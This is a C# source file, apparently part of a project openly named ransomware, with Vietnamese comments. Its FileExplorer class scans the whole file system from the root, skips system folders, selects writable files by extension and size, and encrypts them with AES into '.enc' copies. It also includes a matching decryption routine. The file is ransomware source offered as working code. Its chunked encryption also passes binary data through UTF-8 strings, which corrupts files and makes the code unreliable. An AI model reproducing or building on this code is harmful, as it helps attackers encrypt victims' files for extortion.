// Copyright (C) PhcNguyen Developers
// Distributed under the terms of the Modified BSD License.

using Ransomware.Sources.Utils;
using System.Collections.Concurrent;
using System.Text;


namespace Ransomware.Sources.Application;
class FileExplorer
{
    private bool isRunning;
    private readonly AesCipher aesCipher;
    private readonly HashSet<string> excludedDirectories; // Danh sách thư mục bị loại trừ
    private readonly HashSet<string> allowedFileExtensions; // Danh sách định dạng file được cho phép
    public ConcurrentBag<FileDetail> SpecificFiles { get; private set; } // Danh sách file cụ thể

    public FileExplorer(AesCipher aesCipher)
    {
        // Khởi tạo danh sách thư mục cần bỏ qua
        this.excludedDirectories = new HashSet<string>(EnvironmentInspector.DirectoriesToSkip());

        // Khởi tạo danh sách định dạng file cần lưu
        this.allowedFileExtensions = Config.LoadExtensions();


        this.isRunning = true;  
        this.aesCipher = aesCipher;
        this.SpecificFiles = new ConcurrentBag<FileDetail>();  
    }

    private bool IsWritable(string path)
    {
        try
        {
            if (File.Exists(path))
            {
                using (FileStream fs = File.Open(path, FileMode.Open, FileAccess.Write)) { return true; }
            }
            else if (Directory.Exists(path))
            {
                var dirInfo = new DirectoryInfo(path);
                return !dirInfo.Attributes.HasFlag(FileAttributes.ReadOnly);
            }
        }
        catch (UnauthorizedAccessException) { return false; }
        catch (IOException) { return false; }

        return false;
    }

    private void FindFiles(string path)
    {
        try
        {
            // Bỏ qua thư mục
            if (this.excludedDirectories.Contains(path) || path.StartsWithAny(this.excludedDirectories)) 
                return;

            // Lấy các file trong thư mục
            var files = Directory.EnumerateFiles(path)
                .Where(file => this.allowedFileExtensions.Contains(Path.GetExtension(file))) 
                .ToList();

            Parallel.ForEach(files, (file) =>
            {
                if (IsWritable(file))
                {
                    long fileSize = new FileInfo(file).Length; // Lấy kích thước file
                    this.SpecificFiles.Add(new FileDetail(file, fileSize)); 
                }
            });

            // Lấy các thư mục con
            var directories = Directory.EnumerateDirectories(path)
                .Where(dir => !this.excludedDirectories.Contains(dir) && !dir.StartsWithAny(this.excludedDirectories)) 
                .ToList();

            // Xử lý các thư mục con
            Parallel.ForEach(directories, FindFiles); // Gọi trực tiếp phương thức
        }
        catch (UnauthorizedAccessException)
        {
            Console.WriteLine($"Không có quyền truy cập vào {path}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Lỗi: {ex.Message}");
        }
    }

    public void EncryptFile(string filePath, long fileSize)
    {
        string outputPath = Path.ChangeExtension(filePath, ".enc");
        int bufferSize = (int)Math.Min(fileSize, 8192);

        using (FileStream inputFileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
        using (FileStream outputFileStream = new FileStream(outputPath, FileMode.Create, FileAccess.Write))
        {
            byte[] buffer = new byte[bufferSize];
            int bytesRead;

            // Đọc từng phần của tệp và mã hóa
            while ((bytesRead = inputFileStream.Read(buffer, 0, buffer.Length)) > 0)
            {
                // Mã hóa dữ liệu đọc được
                byte[] encryptedData = this.aesCipher.Encrypt(Encoding.UTF8.GetString(buffer, 0, bytesRead));
                outputFileStream.Write(encryptedData, 0, encryptedData.Length);
            }
        }
    }

    // Phương thức giải mã tệp theo từng phần
    public void DecryptFile(string filePath, long fileSize)
    {
        string outputPath = Path.ChangeExtension(filePath, null); // Bỏ phần mở rộng
        int bufferSize = (int)Math.Min(fileSize, 8192);

        using (FileStream inputFileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
        using (FileStream outputFileStream = new FileStream(outputPath, FileMode.Create, FileAccess.Write))
        {
            byte[] buffer = new byte[bufferSize];
            int bytesRead;

            // Đọc từng phần của tệp và giải mã
            while ((bytesRead = inputFileStream.Read(buffer, 0, buffer.Length)) > 0)
            {
                // Giải mã dữ liệu đọc được
                string decryptedData = this.aesCipher.Decrypt(buffer.Take(bytesRead).ToArray());
                byte[] dataToWrite = Encoding.UTF8.GetBytes(decryptedData);
                outputFileStream.Write(dataToWrite, 0, dataToWrite.Length);
            }
        }
    }

    public enum SortOrder
    {
        Ascending,  // Từ nhỏ đến lớn
        Descending  // Từ lớn đến nhỏ
    }

    public List<FileDetail> Scan(long minimumSize = 1024 * 1024, SortOrder sortOrder = SortOrder.Ascending)
    {
        if (this.isRunning) 
        {
            FindFiles(EnvironmentInspector.Root());
            this.isRunning = false;
        }

        // Lọc và sắp xếp theo kích thước dựa trên kiểu sắp xếp
        return sortOrder == SortOrder.Descending
            ? this.SpecificFiles
                .Where(fileDetail => fileDetail.Size > minimumSize)
                .OrderByDescending(fileDetail => fileDetail.Size) // Sắp xếp từ lớn đến nhỏ
                .ToList() // Chuyển đổi sang List<FileDetail>
            : this.SpecificFiles
                .Where(fileDetail => fileDetail.Size > minimumSize)
                .OrderBy(fileDetail => fileDetail.Size) // Sắp xếp từ nhỏ đến lớn
                .ToList(); // Chuyển đổi sang List<FileDetail>
    }
}
